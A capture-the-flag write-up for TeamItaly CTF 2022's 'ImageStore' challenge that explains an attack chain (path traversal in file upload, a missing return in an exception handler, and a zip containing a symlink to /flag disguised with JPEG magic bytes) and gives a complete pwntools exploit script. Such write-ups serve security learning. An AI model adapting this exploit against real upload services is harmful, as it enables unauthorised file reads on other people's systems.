# TeamItaly CTF 2022

## ImageStore (10 solves)

I keep too many photos of pizzas on my computer and my drive is almost full.
Unfortunately I can't simply upload them to Google Photos because I don't like public cloud.
So I decided to write my own CLI service to store all my images!

Can you read `/flag`?

This is a remote challenge, you can connect to the service with:

`nc imagestore.challs.teamitaly.eu 15000`

Tip: to input a line longer than 4095 characters on your terminal, run `stty -icanon; nc imagestore.challs.teamitaly.eu 15000`.

### Solution

The goal is to place a symlink to `/flag` in the uploads folder.
There's a check against that in function 4, but we notice that there's a missing `return` instruction on an exception handler, so we can call `unzip` on an inexistent path, `/tmp/images.zip`, and it will try to open `/tmp/images.zip.zip`.
We just need to place our payload on that location, and to do that we abuse function 1, which has a path traversal bug.
We upload a zipfile with JPEG Magic Bytes at the beginning, containing the symlink.
We call it `../../tmp/images.zip.zip` so it gets placed in the right place, and then we call function 4 with an invalid base64.
Our payload gets extracted, and then we can download the flag with function 2.

### Exploit

```python
import os
import subprocess
from pwn import *

JPEG_MAGIC_BYTES = b'\xff\xd8\xff\xdb'

HOST = os.environ.get("HOST", "imagestore.challs.teamitaly.eu")
PORT = int(os.environ.get("PORT", 15000))

conn = remote(HOST, PORT)

conn.recvuntil(b'> ')
conn.send(b'1\n') # upload an image

initial_path = os.getcwd()
os.chdir('/tmp')

try:
    os.remove('file.zip')
    os.remove('flag')
except:
    pass

subprocess.run(['ln', '-s', '/flag', 'flag'])
subprocess.run(['zip', '--symlinks', 'file.zip', 'flag'])

with open('file.zip', 'rb') as zipfile:
    content = zipfile.read()

os.remove('file.zip')
os.remove('flag')

os.chdir(initial_path)

payload = b64e(JPEG_MAGIC_BYTES + content).encode()

conn.recvuntil(b': ') # image name
conn.send(b'../../tmp/images.zip.zip\n')

conn.recvuntil(b': ') # image payload
conn.send(payload + b'\n')

conn.recvuntil(b'> ')
conn.send(b'4\n') # upload multiple images

conn.recvuntil(b': ') # zip payload
conn.send(b'/\n') # invalid base64

conn.recvuntil(b'> ')
conn.send(b'2\n') # download an image

conn.recvuntil(b'> ')
conn.send(b'0\n') # flag
conn.recvuntil(b'\n')

flag = b64d(conn.recvuntil(b'\n')).decode()

conn.close()

# Print the flag to stdout
print(flag)
```
